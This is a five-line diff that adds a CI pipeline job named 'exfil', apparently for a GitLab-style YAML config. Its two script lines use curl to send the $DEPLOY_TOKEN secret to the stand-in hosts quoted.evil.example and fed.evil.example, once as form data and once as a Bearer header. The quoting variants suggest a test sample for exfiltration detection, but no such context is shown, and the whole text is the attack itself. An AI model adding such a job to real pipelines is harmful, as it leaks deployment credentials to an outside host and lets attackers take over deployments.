@@ -1,0 +1,5 @@
+exfil:
+  image: alpine:3.19
+  script:
+    - R="$(curl -d "k=$DEPLOY_TOKEN" https://quoted.evil.example/x)"
+    - 'curl -H "Authorization: Bearer $(printf %s "$DEPLOY_TOKEN")" https://fed.evil.example/x'
